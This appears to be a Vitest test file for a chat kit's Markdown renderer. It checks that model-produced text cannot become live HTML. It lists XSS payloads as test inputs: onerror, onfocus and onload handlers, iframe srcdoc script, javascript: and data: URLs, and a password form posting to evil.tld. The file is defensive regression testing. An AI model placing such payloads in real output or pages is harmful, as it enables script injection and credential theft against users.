// tests/components/markdown-xss.test.tsx
//
// The markdown sink is the kit's one raw-`innerHTML` write, so it is the one
// place where a string the MODEL produced becomes live DOM in the host page's
// origin. Every vector below was confirmed executing in Chromium against the
// shipped pipeline before the fix (assistant text -> marked -> innerHTML).
//
// The threat model is NOT "a hostile server". The attacker only has to
// influence the model's OUTPUT: a user pasting an example, a prompt-injected
// model, or RAG over an untrusted document all reach this sink against a
// perfectly trusted provider.
//
// Two properties are asserted for every vector, and BOTH matter:
//   1. no live element / handler / dangerous scheme lands in the DOM, and
//   2. the source text is still VISIBLE to the reader.
// (2) is what makes escaping the right rendering rather than merely the safe
// one: when a model explains `<img onerror>`, showing the tag is the correct
// answer. A filter that deleted the text would pass (1) and be a worse UI.
import { render } from '@solidjs/testing-library';
import { afterEach, describe, expect, test } from 'vitest';
import { Markdown } from '../../src/components/markdown';

afterEach(() => {
  document.body.innerHTML = '';
});

function mount(content: string) {
  return render(() => <Markdown content={content} />).container;
}

/** Every anchor/img/iframe URL attribute the render produced. */
function urls(el: HTMLElement): string[] {
  return [
    ...[...el.querySelectorAll('a')].map((a) => a.getAttribute('href')),
    ...[...el.querySelectorAll('img')].map((i) => i.getAttribute('src')),
    ...[...el.querySelectorAll('iframe')].map((i) => i.getAttribute('src')),
  ].filter((v): v is string => v !== null);
}

describe('markdown sink: raw HTML never becomes live DOM', () => {
  // The zero-click case. `<img src=x onerror>` fires on the guaranteed-failing
  // load of `x`, so it needs no user interaction at all.
  test('<img src=x onerror> does not create an img element', () => {
    const el = mount('Hello <img src=x onerror="window.__PWNED__=1">');
    expect(el.querySelector('img')).toBeNull();
    expect(el.textContent).toContain('<img src=x onerror="window.__PWNED__=1">');
  });

  test('<video onerror> does not create a video element', () => {
    const el = mount('<video src=x onerror="window.__PWNED__=1"></video>');
    expect(el.querySelector('video')).toBeNull();
  });

  // Fires when the user expands the disclosure — one click, no other bait.
  test('<details ontoggle> does not create a details element', () => {
    const el = mount('<details ontoggle="window.__PWNED__=1"><summary>x</summary>y</details>');
    expect(el.querySelector('details')).toBeNull();
  });

  // Zero-click: `autofocus` supplies the focus that fires `onfocus`.
  test('<input autofocus onfocus> does not create an input element', () => {
    const el = mount('<input autofocus onfocus="window.__PWNED__=1">');
    expect(el.querySelector('input')).toBeNull();
  });

  // `srcdoc` is a fresh same-origin document, so its <script> DOES run.
  test('<iframe srcdoc> does not create an iframe', () => {
    const el = mount('<iframe srcdoc="<script>parent.__PWNED__=1</script>"></iframe>');
    expect(el.querySelector('iframe')).toBeNull();
  });

  test('<a onclick> does not create an anchor carrying a handler', () => {
    const el = mount('<a href="#" onclick="window.__PWNED__=1">x</a>');
    const a = el.querySelector('a');
    // Assert the ATTRIBUTE, not the `.onclick` property. jsdom does not compile
    // inline handler attributes into properties at all, so a `.onclick` check
    // passes here even against the vulnerable build -- it would prove nothing.
    // A real browser DOES compile the attribute, so the attribute's absence is
    // the property that actually transfers.
    expect(a?.getAttribute('onclick') ?? null).toBeNull();
    expect(el.textContent).toContain('onclick=');
  });

  // Not script execution, but a credential-harvest surface rendered inside a
  // trusted chat bubble.
  test('<form action> does not create a form', () => {
    const el = mount('<form action="https://evil.tld/steal" method="post"><input name="password" type="password"></form>');
    expect(el.querySelector('form')).toBeNull();
  });

  // Inert via innerHTML today, but only by accident of how innerHTML works --
  // it must not reach the DOM either way.
  test('<script> does not create a script element', () => {
    const el = mount('<script>window.__PWNED__=1</script>');
    expect(el.querySelector('script')).toBeNull();
  });

  test('<svg onload> does not create an svg element', () => {
    const el = mount('<svg onload="window.__PWNED__=1"><circle r="10"/></svg>');
    expect(el.querySelector('svg')).toBeNull();
  });

  // <style> is not script, but it can restyle the whole host page from inside a
  // message bubble (overlay a fake login, hide the real UI).
  test('<style> does not create a style element', () => {
    const el = mount('<style>body{display:none}</style>');
    expect(el.querySelector('style')).toBeNull();
  });

  // <base> rewrites every relative URL resolution in the document.
  test('<base> does not create a base element', () => {
    const el = mount('<base href="https://evil.tld/">');
    expect(el.querySelector('base')).toBeNull();
  });

  // GFM tables run their cells through the inline tokenizer, which is a second
  // path to the same sink -- the fix has to cover the renderer, not one call site.
  test('raw HTML inside a GFM table cell is escaped too', () => {
    const el = mount('| a |\n| - |\n| <img src=x onerror="window.__PWNED__=1"> |');
    expect(el.querySelector('table')).not.toBeNull(); // the table itself still renders
    expect(el.querySelector('img')).toBeNull();
  });

  test('raw HTML inside a blockquote is escaped too', () => {
    const el = mount('> quoted <img src=x onerror="window.__PWNED__=1">');
    expect(el.querySelector('blockquote')).not.toBeNull();
    expect(el.querySelector('img')).toBeNull();
  });

  test('raw HTML inside a list item is escaped too', () => {
    const el = mount('- item <img src=x onerror="window.__PWNED__=1">');
    expect(el.querySelector('li')).not.toBeNull();
    expect(el.querySelector('img')).toBeNull();
  });

  test('<object data=javascript:> does not create an object element', () => {
    const el = mount('<object data="javascript:window.__PWNED__=1"></object>');
    expect(el.querySelector('object')).toBeNull();
  });
});

describe('markdown sink: dangerous URL schemes never reach an href/src', () => {
  // These are NOT raw HTML -- marked BUILDS the anchor itself from markdown
  // link syntax, so escaping raw HTML does not cover them. They need their own
  // guard, which is why they are asserted separately.
  const dangerous: [name: string, md: string][] = [
    ['javascript: link', '[click me](javascript:window.__PWNED__=1)'],
    ['mixed-case JaVaScRiPt: link', '[click me](JaVaScRiPt:window.__PWNED__=1)'],
    ['whitespace-padded javascript: link', '[click me](  javascript:window.__PWNED__=1  )'],
    ['data:text/html link', '[click me](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
    ['vbscript: link', '[click me](vbscript:msgbox(1))'],
    // HONEST NOTE: this one passed even against the vulnerable build, and not
    // because of any guard -- `parseMarkdownIntoBlocks` splits the source into
    // per-token blocks and re-parses each ALONE, so the `[r]:` definition lands
    // in a different block than the reference and never resolves. It renders as
    // literal text. Kept because the assertion is still the one we want if that
    // block-splitting ever changes; do not read it as evidence of the filter.
    ['reference-style javascript: link', '[click me][r]\n\n[r]: javascript:window.__PWNED__=1'],
    ['javascript: image', '![x](javascript:window.__PWNED__=1)'],
  ];

  for (const [name, md] of dangerous) {
    test(`${name} does not survive into the DOM`, () => {
      const el = mount(md);
      for (const u of urls(el)) {
        expect(u.toLowerCase().replace(/\s/g, '')).not.toMatch(/^(javascript|data|vbscript):/);
      }
    });
  }

  test('a blocked link still shows its text, so nothing vanishes silently', () => {
    const el = mount('[click me](javascript:window.__PWNED__=1)');
    expect(el.textContent).toContain('click me');
  });
});

describe('markdown sink: legitimate markdown still works', () => {
  test('emphasis and strong render as elements', () => {
    const el = mount('**bold** and *italic*');
    expect(el.querySelector('strong')?.textContent).toBe('bold');
    expect(el.querySelector('em')?.textContent).toBe('italic');
  });

  test('https links keep their href and text', () => {
    const el = mount('[docs](https://ui.kitn.ai/guide?a=1&b=2#frag)');
    const a = el.querySelector('a');
    expect(a?.getAttribute('href')).toBe('https://ui.kitn.ai/guide?a=1&b=2#frag');
    expect(a?.textContent).toBe('docs');
  });

  test('http links survive', () => {
    const el = mount('[x](http://example.com/)');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('http://example.com/');
  });

  test('mailto links survive', () => {
    const el = mount('[mail](mailto:hi@example.com)');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('mailto:hi@example.com');
  });

  // Relative and anchor links are ordinary markdown and must not be collateral
  // damage from the scheme filter.
  test('relative and anchor links survive', () => {
    expect(mount('[a](/docs/guide)').querySelector('a')?.getAttribute('href')).toBe('/docs/guide');
    expect(mount('[b](#section)').querySelector('a')?.getAttribute('href')).toBe('#section');
    expect(mount('[c](./rel/path)').querySelector('a')?.getAttribute('href')).toBe('./rel/path');
  });

  test('autolinks survive', () => {
    const el = mount('<https://ok.example/>');
    expect(el.querySelector('a')?.getAttribute('href')).toBe('https://ok.example/');
  });

  test('https images keep their src and alt', () => {
    const el = mount('![a diagram](https://example.com/og.png)');
    const img = el.querySelector('img');
    expect(img?.getAttribute('src')).toBe('https://example.com/og.png');
    expect(img?.getAttribute('alt')).toBe('a diagram');
  });

  test('link titles survive and are attribute-escaped', () => {
    const el = mount('[x](https://example.com "a \\"quoted\\" title")');
    const a = el.querySelector('a');
    expect(a?.getAttribute('title')).toBe('a "quoted" title');
    expect(a?.getAttribute('href')).toBe('https://example.com');
  });

  test('GFM tables render as real tables', () => {
    const el = mount('| a | b |\n| - | - |\n| 1 | 2 |');
    expect(el.querySelectorAll('th')).toHaveLength(2);
    expect(el.querySelectorAll('td')).toHaveLength(2);
  });

  test('lists, headings and blockquotes render', () => {
    expect(mount('- a\n- b').querySelectorAll('li')).toHaveLength(2);
    expect(mount('## heading').querySelector('h2')?.textContent).toBe('heading');
    expect(mount('> quote').querySelector('blockquote')).not.toBeNull();
  });

  test('inline code renders escaped, not as markup', () => {
    const el = mount('use `<img src=x>` here');
    const code = el.querySelector('code');
    expect(code?.textContent).toBe('<img src=x>');
    expect(el.querySelector('img')).toBeNull();
  });

  test('strikethrough (gfm) and line breaks (breaks:true) still work', () => {
    expect(mount('~~gone~~').querySelector('del')?.textContent).toBe('gone');
    expect(mount('a\nb').querySelector('br')).not.toBeNull();
  });

  test('ampersands and angle brackets in prose are not double-escaped', () => {
    const el = mount('Tom & Jerry, 3 < 5');
    expect(el.textContent).toContain('Tom & Jerry');
    expect(el.textContent).toContain('3 < 5');
  });
});

describe('markdown sink: the kit does not mutate the shared `marked` singleton', () => {
  // The kit used to call `marked.setOptions` on the global singleton. If the
  // sanitizing renderer were installed the same way, a CONSUMER's own
  // `marked.use({ renderer })` in the same app would silently replace it and
  // reopen this hole. Configuration therefore has to live on a private
  // instance, and this test is what keeps it there.
  test('the global marked singleton renders raw HTML through untouched', async () => {
    const { marked } = await import('marked');
    // A pristine singleton passes raw HTML through. If the kit had configured
    // it globally, this would come back escaped -- which would mean the kit's
    // safety is only as durable as the consumer not reconfiguring marked.
    expect(marked.parse('<img src=x>', { async: false })).toContain('<img src=x>');
  });
});
